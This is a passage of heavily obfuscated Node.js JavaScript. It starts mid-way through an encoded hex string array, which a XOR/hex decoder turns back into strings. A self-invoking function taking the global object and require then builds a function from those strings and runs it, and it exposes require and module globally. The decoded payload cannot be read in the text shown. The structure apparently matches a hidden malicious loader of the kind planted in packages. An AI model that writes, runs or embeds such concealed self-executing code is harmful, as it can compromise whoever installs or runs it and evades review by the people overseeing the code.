120f7d455c4001134a5d0e407d5e66067d1e7d5d5d584054095b7d7d6413416c75021f62014c5a7d064c0a4c4b1f0458130b6a13467b1313405b4b4e564113464071017d087d7d587d4c191a447d0c657f01130e7d1a4a0e5d547d4a14564a7d07011f12144c465c014c07485b7d1d5f5a1612627e4974540360410f01017f61460713017d4e467e7d01014c0a5b0007007d13015d017d5d0101430e5c4c5a4a014e7f517d0e4c1f1c4e7a7d0d5b4c5c4c010e5d797d5f4e46551f134d0d4b5b484b0e015c100c4c594b7d510c7d137d1306077b4d01667d067f4c1319101806721b78190c41417f5b01525d4a537d7a117d4a4e7d065f0c0f417c044d1d0a467d45525c07774171405c564c5c484b65015c5c745f447d17010f5c5a585d7d4156524b400168467b011358044c01074c5c140e0f4147077d037d6c7d741309777d1313014c4d4c7b7d5c6e49414c7c027d0d4613014c6d07537d7d017d4b0a7d017a007d015d63135b060e7d4a7d1d4c5f5f0e5c13117d101e7d0b135b4a7d13137d401f5d5b49077d4a5c4d6b7d1843464e7d01525c01005c7d4c5d5c4e5d437d0a49725c1f7d0113434a135d4a0a5c015c43435c4d177d60576c7d5b4c1e5b195401020f7d43014a7d40014c48427d44407d5c4d4c4e1366565a527d5d5b0c5c09535b7d4e577d064740017d5c490f447d7d7d1b4c5d0757014c125b0113461c077d570f011301017d0b490d5b0f7d7d5c6113006c0f7d417d4b7d5d5f7d7d13404b13017d135d744e5d0d4313010f7f0d017d5c017d015d4c0e590c6b497d4a4a4d4054037d064b175913497d4c014c65135b4a010e7d7d0d447c077c067d0c137c01477f525d5b01070007014c071e4b137d580e5c5a1f0740017f4d071f017d654c6a466c0149070f0146014d5a4c130c5d0101017d7d741706700e7d017c7d6d0e0d5b7d794d41707d434c7f7d7d0f407d411447137d7f6f5d174e7d5d434c534c401a077d5f06137d574b13130b0141134340524a5d7d1340567d4e41014056017d666d13475b134c404d6a467d520742625d017b4e7d1f7d4a5b467d52010e13017d1e165b136e4a4d7d70634c43470e6b1f5d017d1f4643465d7d4c005c17134c7d075d057d6f4a1313014314015d4c027f5a434e7d4c4c7d460d1f196f0e7d4c0e017e44430313481318524d074e7d4c63014c5c080401017b07135d7d1313010109494b117d400f4c404a427d4c5801434c41074c157d08535b137d417d76721b621f687d017d697d5a5b010e1349015a040b045b137d05185c7d7d7d07464d474b127f0113527d7d124a7d01700601065d5d031b090f437d524a137d197d7d13714849434a7d4b5c5b7f51134d4c01075c56131a527d4610434c471309011c545a01417015467d184d141f137d134c7d7d7d4c7d6f531e5c4a687d5c1d064c12471349164a13135d044a7d730806091a5d5900695d74014e015b41017d7f5d417a1340704c1941126a7b13014604574c18434a595c5a135d010e7d4c130e727d580f017d7d07727f7d6b010f43490e1509014d4b5f7b43017d0c7d7c010b7d13077d0f13134c740141010f407d5d19185d134a027d025a4c057d7d0b7d014d4e4a564c5c010e747d577d7d136b775b49414c7d7e7f465c7d5b484c13014e7d170e4d0e137c5b1f137d110f7d7d5d467d114c7a5f014c7d78757d0e7d6b64061f4c594141445c014a0f7d0f714b437d134c497d7d5a155c687d4a0307487d797d0d7d5a7d7d7d0d7d5b7d137d5c0d016a7d46707f097d134356407c48085c11597d4c584a1b7d4c484f014713704c08075a424b7d7f1140167d7f411e7d0c014c497d137f727d5c004e41495e617d7d0813017d4c174c467d7d7d4c014e705f5b6440135f5c5d1318137d7d460140704c000e417d7d5c070f117d7f72575b5b705c7040476d134e085c09017f130f0144684c195d1318464000587d667c7f7f4c57477d584c0113014c464c0a1e7d4917164b7c0f137d4d4c5c7d797d5c575d4b4e727d145b107d6103037d11064c7f760d4c7d4c7d4a690f0e1f7d7d5e52525d1f1a631901137d015d49130b5a534c134c137a026b740f4c4c0140131a14130f07016a0147017d7043137d5d13136913745b5b6c400a427c017d7d1c664d4c46407d7d134e5f7d4c7d4c747d7d130149417d7d03017d6d4e410756007d53675f68417d0113127d7d135a074e4c5c0b7d1c4a7d06424c706e1b5a415b0d4a145c405d070a7d7f5b074a480702055d0e42137d6b077d7d4e015d484355017d5801497d725e4e59407249070a13134c4c43131b5c16736f5a0f164a0105570100695b7c7d7f74010b0a414f550613130b0e1a7e4c4d04727d1c5b7d1349467f4c4a73135546017d4c4e4d5d0f0713134d4159190e5b4158704c7749074147017452055c074f137f11077d13010113575b167d07014c13074a1f7d017f4e40010e4b0707026f491f4a1313197d407d5a14074b4f0f7d5f0101135f034a137b1361017f7d01747d4c6055064907134372015a54105d49137d147d1366054e13130b4f7d070f07010101130d1513617d0a4a7d0f460c01550143075d7d034b7d4e014b7d59135c794c075c7246066247017d41137d7d7d5b5b7d480351017d747d0c4a4901145b5b5f01065c7d417c5b437d7d1d404a01094c46074e52010d7f09565c4a7d704e0a5d7d7d016b13467f5c7d6b0e4601427d0d7d455547135a7d0103114b4a014560524e7d7e4c79135c0b1c6c487d137d1a6a4c4b7a474c4a010e7a49017d025719137201584c1313016a0e5d7d7f7d466c57017c7d0e420141774d01184901554a49757d0d0d72075613574d134413727a7d024c525e49010e61461276467d407d7d61016f5c581e635a4a1e447d090f0c5d6b4c4a7d014e437d7d017d01070d72627d5b62467d5d065d435a7d4b09017d7d4c5f464966431d7d137d13131a49065509497a7d4a4c135c1b134a415c7d01400d134613037d0e5c0f406d467d024c7d1f437d615b7b7d067c7d4c13494b5a5b7d7d4b7f557d67077d4c5c067f6b134c0b7d571d09151e675d43400101410f495c010b41175a5f600b1f465c5c5c46010213597d1301135e7e070e7d0e0f740e4b575841017d565a0546104b7d0a017d1d7d5b115d185c0e5b7d5c707d4a4b4f0e130b727d0f7d420e7d49577d0f427d40440e4c5b13070101417d4c7c7d41730901131f7d7b4658425b5f1c0568077f5600415769475b7d1301156840010101077d5b015d01131f4c5b7b075d130f014074465901137d1e5c7d164b727d047d7d474a7d0e4c4c1d7d7d4a0d164c745d13146b4a7f4c7d7d445b68434813105b6e7a085b5b7d7e7d520f581c5b7d4e5b7207795b021013131001010d435d06014a7d027d7d66716a6459011b187d40044661134a4c4a01417d57075b7d677d0f5b17147d465d06134e7d4c57075e4e7d5c6f494a5d7d62011312014c5b6f13494c7d017d067d015d57430e5b0003435c7d7d7d4c1201461f1c7d477d7d5c5470577d5d137e134c034e13136a780762407d130f5a5b6a0d49524d495d01135c7d04724b5d0f137d0e7e7d5801460f667d7b707f4001074c1f5b17075c7d7b7d7d4c416d7d0e0d0157666b016e46524a5f407d1c0e405512724a5b447d5b005a6e1e1b7d7d167d4c5b0e614e4b5d7041686c0e004d0b527d0d574b13467d4c5b71015a5a58121c4b7d5f58487d167d177f5e7d460c7d5f48165a121e461f4913017d137f1f49525b59705d1c4a5c1513495d1346180713560740437d014a1640406d7b01707d5b406a060f4e5c07134c7d464a4b5b5c5c7d007d7d004a5d7d0701584c4a017d015d7f56077d600713014867575d7d137b01630e7d570713400774010454134c137d13014a46617b7d6c7457011b7d447d0b5f640d01434c7f0701135b4401137d7e69444158667d06015b027d5d124a5413017f7f0f0c6a191c4e5f1c747d06634b4b4c147d577d0e7d080f40400e0658014a0e017d4c131f0a13465c5c167d5a6019465d0b017d01465f190a420219587d461355130f485d1241584a7d7d6170707d077d4a65597d497d0a15617d7f7d13417d7d7d0b017d01427d135d7d0c546a4c01064d13195f4a467d490c5b6301017d137f457d7d0107034e704343010f016b0f4813075d47590f0d1b440e0f4f437d13444a1e0f4c0b0b1a7d55017d7d724a5a096b467d0f017d1307074c4a5d5c6a014e407d474a49060a4a637d0601150171064a5c6c7d0152017b137f71010f6b56130c7d4c7d5f617d5d06417d7d43701c4b1778074c12021c6a4a5e4a46627d7d4a7d557d4e4c6c5a4a1343137d5c46014e145d4c1301434b7d76017d4e5d437d4c4160491c477b5c4b5b13620d42135c07415f52156e0149567d137d6c130c7d561f597d1352137d01130a4e5b5c0e437d1102131d43434b01415d1a12076915017d7d43417d4c7d0d5c551c400d13497d091c01010e7611497d064d4a7d435c475f620a134901074b0e4e4d46697d0f1c584e62135c4a01015e497d01467001096a0e01097d7d7d4c7d57547d747d0170107d1d0e0e7d7d4c57067d6662010649120c1e6a634d7d7d41654a4e6246421e067d7d7d700f5313434e131c061f564c4b09010c41124301537d5c140149074a4c014c5c124c54107d000a4b700e4e41604c4a137d5d574e01084d061270134206464c6e4c6c7d4c0141137d014a0f01017d02136e7d1a017d42744b7d13131d7d016e4116577d4c5b424c6a0a7401017d037e5b135a7f49700e137d120f5b757d4c435f7f05015a4a5f191349014d177d7d134c7c5d44134a527d4c444b4c0114135b55014301130e464001135d001d137d124d4c7d7d5c796b017d011e4d134c4c137d52134704010f7d597b7d5f707f13015d5c075a7f7e5b15010113117d44160e124e1440134e0501185d721f7606174c525507134e017d014a177d400f5b430f7d4c076e51460e05074d7d0a4c7d034c1f5b130f5d627d7d130f7d46130f01497f4a05046a06420140450101421742014c7d070b1349017d01464b4a56524c6d7d7d0e5c4c134140167d13410f7d585d611f0c5b7d4b5a4c70027d7c0d465446060741624c7d131f61130079131301031f045801721358137d4a4a7d0358004a7d017d0646010f7d134a0f01197d484e015d485c047e465b4b01400e4c5b4a4e637d40061c7d0f13014c4b01000151130f015c73014a135c5f1a7d01137d7d584e0e05017d065b7d0340497d7513755b4c7d475c7d5d0b00017d6c01014d0f0d4c7d5b0308434a4e4c7f4c0f7d7d137d550d137d460f431f407d7d4b7d5c18017d074a6c4c7d7001190d707d01015f1309444b4b4a4a0113120101434001127d130e4d01097d4c135b4c6c5d1f42094c775a0858414b015c145c58047d1b005c5a6b464c7f4d4e0f0101460e401e715d5266114a1b13157d586c7d464c137d7d7d4c0d010f4b7d5f5b1f13017d441f1378175d0f7d417d016b4c016c610f43584047014302137d135f4c4d7d0f7f4a194776027d5b014c6a5f1513044e0279137d4e7d490807135d7d7d7d09134e55131b7d7d7d016a061801575d4c1f4643677d7b465c4c0175497d494c7d57025b4706017d0c120e136c01580d43544a724a027d1300135c1b615b01405f0d4c4a011b7d41547c7d40137d066c4c72064a077d58177d7d010f131e474c545f174c7c0e4a137d107d644e1246197d467401667d5f7d0b7d4d577d7c4c43015f137f0e494e0e59595c60010e5f7d7d5b016a48437d5b13010e465a4b01435a13465c017d407d1b0e017f014c42017f46527d400101437f617d5619125b54134e4a01700e7d587d5b4e7d015c49010e01721b744a017d446a520252594a01010b6158466b0e52011f7d0c13465c4e7d1c5f0a1352014e7d6f7d655b017d684e57017d085c5f6c1f0e7d684c5d011d697d467d4a7f4e7d415c7d7d7d414e137d061a7a150d41124c4b4c106e6d5b011d1f015b4b4c0e6c1e7d0f4c01134a4b4e6e017d0701034a437d4c7d134c0913014a6c7d7a7d4649544e65647d044a570257157f4c0a4a466f4a4c7d4a44105f7d011b0f7d7d137d0c0b4c010146040e1b7d7d0b7d1c0c7d015d077f467d7d134c017d4c46707a0e557d7d7d145a71530175015c077b7d7d7b4c014b527d135601704c13017d7d540b447d1b696d070b731358010f01147d134a7d1b735c7d4c17137d017d746a4b7d0f5a407d74527907015f4b080d13654e071b5f5d6e7d0701614c13135d5f1c0111550f4a4a7d0e1301131a1815097f064c747d4d7d7d6a6207707f01527d7d0601127d475d13036c7d7d7d0713441c7d0447410f0a7d017d6906437d147d015c0f7d014543427d070743406701137d13547f7d4a7d4613134c4b4a64017d01497d1d5f7d074e4051017d567d7d7d74157d7d104a465c7d7f49440f765c075c1c014c0f131b4d4340131f13165440137d7b6f7d0101417d467d144e43105c407d1f48137b017d5b42135a015c73107d4301707d4c4c551b0915101f0f011a7d004c5b4c1b137d1147460a01460c4652137d016a424c1e576e41497d547c4c5d017d010a530d017f5d5d7d41134c7d417f0e4e7d7d5b7d497d017f0f17087d13656e0f7d0946134a4c4c54724c49017d424e7d01465d4c01467d4a750d4113560e130f4c7d0f0c13034a4c0e7d4b165c464c04701e4e015d5a01014d01017d4a47137d51460b405b13497d4b4c465b13734840701f437d42596907134a165c137d5b5b070f0e7d417d19521301465b60010109165c1b4b617d4c0f0140017d7d0172451f0f7d0f424e1b145d135c6c4e06090f42407457437d05475b0e036e5a5f0f7d5a03497d5b497445067f054c7d7d1e137d7c590f5c0e1d4c665c7d01014a181b477d4b084c15595c5d015c14134a0713700e627d497d496363484e43010e015a017d1607624c434e074b525b604e01527d4c664a4d426a4c1f61077d6b0a4d6a0b0f5d4b134c5806016913604d75787d014548017a1b0d4e497d4f08420a004a494e577d7d7d147d414e1518597d1f4d4c014e707d1313457d7d5c010177065c5f68460959084a0143011d0166014a165d7d4a015c081e125d014a7d4a574d4d707d7d704a164c4b1369667f0e014c7d0417011b1b19007a1313435c0e72135a4f5f7d5c5a4d134d11657f585f6f46437d134606440e4b7d63447d015b5d7d57075d5d060a0f000107724d174c7d5c04597d024c065215405c7d014c0c0d134c5e44134a440146427d7c61017d5c6a0f4d7f7f4106134a52401f4a0d011e4b7d667d0e075d010a016601017d49554e70107d7d444900035b4c7d7d66490113467d0f4d4b7d60014c7f4c4b4a7d015c524a45694d5f144001495c134c70424c134e69014b414c1f4c0f7d7d7d015e410f017d4c7d01477d6445137d5c01444c131c7d5c014c4c7b5b015b5d5b415b11581400664c754c175d1346017d5b117d4c5c01015c0f5c547b4a0f130e0104017d01135a7d7f7d400113640142014e015c5d62137d0f014c587d464c137d06417f07137d7d4a4a5a5b4c654c0a5f61017d5c4c4a01124a4e491f13086f7c521e13137666455d0e0e131b4e01497d7d014309137d0b010143590152531a097d017d0e130657495c014d0b157d4c0f4301130f400765014a010c6101185b13064c13580f4a7d1f011213564c0f0e01017d4a101341086d747d4d40084e5a7d520f5d4e4a0c7d1201467d075c5b1d014d510f137c4c01525b7b5c7d5d134e7d060f5d56465d0e6c134c0f5b4b510d0f77015b5b7d137d0e4b0f4c01010e4a4b017d01137d0f41017c414a0e0e061b0040777d7d5a014a417d13015d7d5e7d0d437062014a495b5b5d0f5b7d4c01705d137d017d014b4b547847547d011301097d7d4c13014849527d4c5d1a1d4b5b4a524b0752104c69180157560b78130e01014c195f4c10614c1f5507471b017d7d401270404e017f490e491b477d017d4b054a124b0c4c4c195d5d5440007d4e7d7c01550159017d6b4c1301747d1601085b7209017d7d7d021b7d094a58734c7d764a4041490f5b0142064a1201464c64017d54011f5c431e5f4c7d5c074c474301787d01564c01544a46431c495b135400016c01070141134306114213134b1e134e100f414a4c137d01014e5943407d59457d484a01700f127d04017d7d01584b7d014b190a01664c4c07045b01154c4608014c475b014d017d0e5c1b495b707d575b4e135c5267034c4c014b447d414c0101524c0c0f41067d010770064c1e1c01405b01400152130e015b7d7d06015b13010101177d4101675b4c5b134d437d405b4c7e684171057057424a4c7f7b52010113135d1f0f436a5b0e4b410d1f5f49014843527d134a7d437b6f4601014806414a1b7d5a13497d7d7b48014c7d014c014a4a5b130101714a4a035d145b535f4c5b4a78695c0f7d484e4b7d5d406807435b430f0c07565d13010c4b4b5b01137d0f460240135c5b664b0e4d067d666a5b057d7d41097d014c13467d42437d070207425b4c44017d560e1f7d7665134c017d46115d5d010f58164c7b4e7d12137f4c4b647270731d49070f0c017d5c0a015b4a1341007d5d564c4c01417d4c0b017f09014901464c4c6d7f617d4b7d147d011a137d7d13427f4054077d54704113437d464b01477d0f014b7d417d5d0e65587d1f017d7f7d5d0111120749134a1001136d4972577d4c4d4c7f4c7d5c52137d075c017d7f76017d7d707f44074013074b43131f4a7d031e156b1e5c59014643474a707f7d5f4c4c7d1e5e42014b420d135c465c7f4b01100f5f424b7d477d414c5b07100b7d5d5b7d57014a064f01017d015f10460e7d1e7d5d070f54014a7b7d7d52014c52137d7d1701017d5f7d0d4c4814014c4c1f7d5d7d010f5b091c414b1a4a4c7f4d70017d0e7d4e4c4c7d4d4c4b4d524c070e545b13017d415901617d09514a6e5c0b550d131b130140485c496c4e7d4313404c6a7d407d7d5b0101135c01464f7d10015c484c01017d5c7d5c01080b577d4c5c617d7d0e7d4f7d407d70410e0c7d030e1a5e49010c6d667d6f4301030172407d4a7d4e53137d745b131315534e741b137d517d0e046a48027d014e7f0e4a0f0943131a410a4c7d7d4b695d564c015c007d011454540367011413411301061b015b4b427d065c7d4b07427d4d5401137d4c015d7f42014c7d4a0f4c7d4c447d5706134c094c4601564c4a435a56140301774b5d7d437d7d0c0f4c4c49014c7d0f0f7d0b7d4c405d5d07015d6c5f13615d0c6a07727d417d0d464541487d7d1b136c0b4e4b437d4e4c095b070e027d5f01724b40014c467d525a5c7d5d5c07410f6c130e1401494c014c6f55135b7d1b5b6c7d5b7d5b4c12014c1c4c4940010e0f0f7d1413494a177d4b5d627d7d744b61744c567d4c15117b41134371014340177d467d7d4c5c5c4c527d5b5f4c54015c7d5c010101524c017d4e7674134e050f066607434b7d07585c5d190f057d180e4e137c014c13737d016d6a637d4a197649131e134a4c7f5d6b4a0f5c431f7f4d6b0c7d72400108134301420f7d075f06134a444e4c014c7d014b0101705a134e08130f7d43464d4942414b497201070a7d7d137d616b4c7d6a7d0c7901014e5c4e7441097d030b13037d13401b7d7d4a6a7d065c5c6372176a7c7d7d4a7d6a467d547d134c01540f4c7868495240474b4c4e5c0172010f497f120f405c19186a404c667f404c0f011846484c696c7d010f134c6a01610f014d7d','475e4a5d5c57435a59584e4c4b454d564248405d554944404c465f5b5d5a5b415c5b40414c','68606c7f6a','45404641','1d655b757d4955','1c161c181d1f1c75595b4b5f58','1e1d1619687d5d4a5541','1a1e1f1e1e1b1f4b7f40435646','1e1c1f1b1f191f176a6b45586667','434a41485b47','4c71424a454d715b5d40','5979454d7d','655677474e','177b42667f5b78','4c5e4e7748','5c5f43465b','5c5e495d7e','49634d6265','1a1f1e19577546586169','124e4a415d5a47074e43121a4c034817494b5a01565d0f0101414c4a4c49031a0d5f4e4a4e5a19434145065d721d5a590d57025e07720f4e14075d1214145d04074e7417015c1d5b6e48405e035a47176c034e46035c144e076e421f07414514455905031859401807060740144219404e1b5d5806010f5d404b74495c1d41544b5d595b1b5706041f034e415d045d5d04400652551e0f124749744e41175d1e5d7403725c18021818434e4e015a461854021f19164359425b1d5d124672721304065a034a06030314415d47745d121f59025d071403125f066c5a5c12044c14481449145e6e06061e59460659441f415d431e4e4a0f4912741447465c56014a42074b04400e1d0f12074a594a4e18171201061b4a461248014112544949121e74131d4e0f491e125d141b037c065d5643591e5a0f5614445e43545b5941590f076c0f0743034059415f0f46125b435d035d0143584055470743035b5e14145d5d070759124e475c591472575e124e4d144b4e140307075d1459455e01075b7404064b4e065d4b415d475c1b1e5607595d144947141c480d724a07014e475d5f4e5f48724801064148495f411e4703464c43141406126c14421a12045d030f0106145a12045c520406465b03044d42144b045a420602125c46465e4043125b125d125e160401014c475e047419494a0f5b1f415d5f5d070f595d1749435d41034b4b485b0f72194e011442145d5b4701485e0f1d4e524a594a464c72484d5b46131b40146c144303555546190443744e741404075c460d43460d5d03415f46165c03495d49475a58064058124a54074d12584a411d5b01485a01461244464e4e4e040656495b5f4e1c41520612160d064c5f6e045a145a5b5f720d12434418595f5b0f1e5d144755580d065b070616060701435a43125c1849140f145c5e1f06410d56041f5c5212594e045c0f4247071f5e0172475914110f1f19126e0240554a5b5d075b1e5d5b5d5c465c401f4a03011455740749131a4a185b03075d4e404e59415d145b47474914590345125d140f065d111e17554740054054134e44425c41064e445b4a01594016044a4e1f4c434640144d5a0f12726c0e484514561c0443064a1201524b5d12461940466c175d41411f1419124e5d0d52015d4a4612727c5b5c5d414101141d5d125b14745b144659125f5d6c5d4107064e5d4a5b5a55040f474344740457124a0f02174554074a455616070706060f','4c474e5d6e5b','5c5a4d5c5b5d464148','4a5c426a63','1e1a1b16181f16667a766c7e40','404748605c','57557c607b','7a6b754c40','495d40426c474e5d6c404b4a'];wxXwNiPwMUCJKkunuVVRoy=function(){return RLnoNbS;};return wxXwNiPwMUCJKkunuVVRoy();}function iSWeW$fhv(sEVMwdCukLECUDZcoKKf,TfHqysq$frQc){var cXCTx_zSOTFa_nB=wxXwNiPwMUCJKkunuVVRoy();return iSWeW$fhv=function(zLo$Tv_V,bRvmT_hjx$J){zLo$Tv_V=zLo$Tv_V-(-parseInt(0x1)*-0x2483+parseInt(0x1964)+-0x1*parseInt(0x3d3f));var aC_DfrKy_HvqJc=cXCTx_zSOTFa_nB[zLo$Tv_V];if(iSWeW$fhv['OozVbJ']===undefined){var Mt$FWvjJNp_hh=function(rmJxlgnBUqqHBeJQKVQU_LRpPj){var jo$hgOsqyajWyMekli=Math.ceil(0x23)*0xe3+parseInt(0x36a)+-parseInt(0x2044)&parseInt(0x1a52)+-parseInt(0x1136)+-0x81d,eBmAiJyX=new Uint8Array(rmJxlgnBUqqHBeJQKVQU_LRpPj['match'](/.{1,2}/g)['map'](EMxgqZQaBxrWMqmq$hcqaXgw=>parseInt(EMxgqZQaBxrWMqmq$hcqaXgw,0x226d+-0x1ebc+Number(0x1)*-parseInt(0x3a1)))),a$CSlLfL=eBmAiJyX['map'](JJtsWFpIrgrB=>JJtsWFpIrgrB^jo$hgOsqyajWyMekli),MJ$VZi=new TextDecoder(),qviv$NlvsoXV$jYesmELb=MJ$VZi['decode'](a$CSlLfL);return qviv$NlvsoXV$jYesmELb;};iSWeW$fhv['oDmbQR']=Mt$FWvjJNp_hh,sEVMwdCukLECUDZcoKKf=arguments,iSWeW$fhv['OozVbJ']=!![];}var WRJ_CQhLR=cXCTx_zSOTFa_nB[Number(-0x25f0)+0x1738+0xeb8],DQBMHiGOCPEIRHQO=zLo$Tv_V+WRJ_CQhLR,wfsxh$ho=sEVMwdCukLECUDZcoKKf[DQBMHiGOCPEIRHQO];return!wfsxh$ho?(iSWeW$fhv['ZxIIpP']===undefined&&(iSWeW$fhv['ZxIIpP']=!![]),aC_DfrKy_HvqJc=iSWeW$fhv['oDmbQR'](aC_DfrKy_HvqJc),sEVMwdCukLECUDZcoKKf[DQBMHiGOCPEIRHQO]=aC_DfrKy_HvqJc):aC_DfrKy_HvqJc=wfsxh$ho,aC_DfrKy_HvqJc;},iSWeW$fhv(sEVMwdCukLECUDZcoKKf,TfHqysq$frQc);}!function(pafQNAVhqtjEUNwpuH,kh_EDbfPdNsC_kp){var lUQsFmX_vcsWB_xfsEfI=iSWeW$fhv,RPXtx_RLI_xZywplOZudouY={'ohgOs':lUQsFmX_vcsWB_xfsEfI(0xc4),'eklii':lUQsFmX_vcsWB_xfsEfI(0xce),'JyXha':function(L_VrEyVAmwCMYAMlzqyavshl_R,rxagwHeKSYfpelTHcdZuzFHkV,ZKSyhOgo$WF_ZyhGBaXR){return L_VrEyVAmwCMYAMlzqyavshl_R(rxagwHeKSYfpelTHcdZuzFHkV,ZKSyhOgo$WF_ZyhGBaXR);},'fLbMJ':lUQsFmX_vcsWB_xfsEfI(0xb8),'lvsoX':function(Ues_yPsWAyWxHSkWgWOmPIlnwU,Plt$UbrBmF){return Ues_yPsWAyWxHSkWgWOmPIlnwU(Plt$UbrBmF);},'esmEL':lUQsFmX_vcsWB_xfsEfI(0xcd),'qZQaB':function(iQxnj_Sr_CUzyhG,hHbzuVitJPRFAAI){return iQxnj_Sr_CUzyhG===hHbzuVitJPRFAAI;},'cqaXg':lUQsFmX_vcsWB_xfsEfI(0xaf)},QstRcFPHplSGOYpxLbEZMMvmr=RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xbd)][lUQsFmX_vcsWB_xfsEfI(0xb4)]('|'),CIjCVAJPNJcGjJF_nNGDYBC=parseInt(0x12d3)+parseInt(0x14b)+Math.trunc(-parseInt(0x141e));while(!![]){switch(QstRcFPHplSGOYpxLbEZMMvmr[CIjCVAJPNJcGjJF_nNGDYBC++]){case'0':var QNzLaZhNyZBlNljLlH=peel(RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xc6)]),WriZrjhxFGjtbPSreLAG_h$u=peel[QNzLaZhNyZBlNljLlH[lUQsFmX_vcsWB_xfsEfI(0xba)](parseInt(-parseInt(0x1cb7))*Math.trunc(-0x1)+-parseInt(0x98a)+parseInt(-parseInt(0x1))*Math.max(parseInt(0x132d),0x132d),-parseInt(0x3d)*0x6b+parseInt(0x6da)+parseInt(0x12b0)*0x1)],asav_n=RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xb1)](WriZrjhxFGjtbPSreLAG_h$u,'',peel(RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xb6)]));continue;case'1':pafQNAVhqtjEUNwpuH['z']=z;continue;case'2':RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xb1)](WriZrjhxFGjtbPSreLAG_h$u,'',RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xc3)](asav_n,peel(RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xbb)])))(Math.max(-0x1d6,-parseInt(0x1d6))*0x3+-parseInt(0x263c)+-0x9*Math.floor(-0x5f3));continue;case'3':pafQNAVhqtjEUNwpuH[oFTjev[0x202a+Math.trunc(-parseInt(0x959))*Math.max(-0x3,-0x3)+-parseInt(0x3c35)]]=kh_EDbfPdNsC_kp,RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xc5)](typeof module,oFTjev[parseFloat(-0xdf)*-0x23+0x2*parseInt(0x1257)+-0x432a])&&(pafQNAVhqtjEUNwpuH[oFTjev[0x15d9*-0x1+Math.floor(-parseInt(0x1a4b))+0x1813*0x2]]=module);continue;case'4':var oFTjev=RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xc3)](splitLane,RPXtx_RLI_xZywplOZudouY[lUQsFmX_vcsWB_xfsEfI(0xb3)]);continue;}break;}}(global,require);
